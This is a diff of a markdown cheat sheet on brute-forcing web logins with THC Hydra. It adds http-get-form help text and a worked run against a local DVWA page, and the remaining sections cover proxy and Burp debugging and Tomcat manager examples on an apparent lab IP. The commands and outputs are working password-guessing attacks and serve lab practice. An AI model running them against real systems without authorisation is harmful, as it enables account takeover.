@@ -4,6 +4,8 @@
      - [Supported Services](#supported-services)
 - [HTTP](#http)
      - [hydra -U http-get](#hydra--u-http-get) arrangement doesn't matter
+     - [hydra -U http-get-form](#hydra--u-http-get-form)
+          - [Example http-get-form](#example-http-get-form)
      - [hydra http-post-form -U](#hydra-http-post-form--u)
      - [HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables](#use-hydra_proxy_http-or-hydra_proxy-environment-variables-for-a-proxy-setup)
      - [Debug, send Hydra output to Burp](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line)
@@ -57,7 +59,7 @@ Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebi
 
 # [HTTP](#http-1)
 
-### hydra -U http-get
+## [hydra -U http-get](#hydra--u-http-get-1)
 hydra -U http-get
 hydra http-get -U
 ```sh
@@ -74,7 +76,82 @@ The following parameters are optional:
 For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
 ```
 
-### hydra http-post-form -U
+## [hydra -U http-get-form](#hydra--u-http-get-form-1)
+```sh
+$ hydra -U http-get-form
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 12:04:59
+
+Help for module http-get-form:
+============================================================================
+Module http-get-form requires the page and the parameters for the web form.
+
+By default this module is configured to follow a maximum of 5 redirections in
+a row. It always gathers a new cookie from the same URL without variables
+The parameters requires at a minimum three ":" separated values,
+plus optional values.
+(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)
+
+Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
+
+First is the page on the server to GET or POST to (URL), e.g. "/login".
+Second is the POST/GET variables (taken from either the browser, proxy, etc.)
+ without the initial '?' character and the usernames and passwords being
+ replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
+ ("^PASS64^" for base64 encodings).
+Third are optional parameters (see below)
+Last is the string that it checks for an *invalid* login (by default).
+ Invalid condition login check can be preceded by "F=", successful condition
+ login check must be preceded by "S=".
+ This is where most people get it wrong! You have to check the webapp what a
+ failed string looks like and put it in this parameter! Add the -d switch to see
+ the sent/received data!
+ Note that using invalid login condition checks can result in false positives!
+
+The following parameters are optional and are put between the form parameters
+  and the condition string; seperate them too with colons:
+ 2=                  302 page forward return codes identify a successful attempt
+ (c|C)=/page/uri     to define a different page to gather initial cookies from
+ (g|G)=              skip pre-requests - only use this when no pre-cookies are required
+ (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
+                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
+                 Note: 'h' will add the user-defined header at the end
+                 regardless it's already being sent by Hydra or not.
+                 'H' will replace the value of that header if it exists, by the
+                 one supplied by the user, or add the header at the end
+
+Note that if you are going to put colons (:) in your headers you should escape
+them with a backslash (\). All colons that are not option separators should be
+escaped (see the examples above and below).
+You can specify a header without escaping the colons, but that way you will not
+be able to put colons in the header value itself, as they will be interpreted by
+hydra as option separators.
+
+Examples:
+ "/login.php:user=^USER^&pass=^PASS^:incorrect"
+ "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
+ "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
+ "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
+ "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
+```
+
+### [Example http-get-form](#example-http-get-form-1)
+Hydra is super sensive to sequence
+Make sure host first before service (http-get-form), followed by 3 compulsory parameters seperated by colon (:)
+```sh
+$ hydra -L usernames.txt -P best15.txt 127.0.0.1 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect'
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 12:51:51
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:3/p:15), ~3 tries per task
+[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect
+[80][http-get-form] host: 127.0.0.1   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 12:51:52
+```
+
+## hydra http-post-form -U
 ```sh
 $ hydra http-post-form -U
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -134,7 +211,7 @@ Examples:
  "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
 ```
 
-### Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+## Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
 ```sh
 $ hydra -h
 ... [snip] ...
@@ -145,12 +222,12 @@ E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
 ... [snip] ...
 ```
 
-### [To debug, send Hydra output to Burp. Use this in the same line](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line-1)
+## [To debug, send Hydra output to Burp. Use this in the same line](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line-1)
 ```sh
 HYDRA_PROXY_HTTP=http://localhost:8080 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 ```
 
-### [Common Mistakes](#common-mistakes-1)
+## [Common Mistakes](#common-mistakes-1)
 login: admin   password: admin are not the right combination, see the help above
 ```sh
 $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
@@ -162,7 +239,7 @@ $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
 
 ```
 
-### [Now you got it right](#now-you-got-it-right-1)
+## [Now you got it right](#now-you-got-it-right-1)
 ```sh
 $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 
@@ -172,7 +249,7 @@ $ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-### [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form-1)
+## [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form-1)
 ```sh
 $ hydra http-post-form://$ip
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
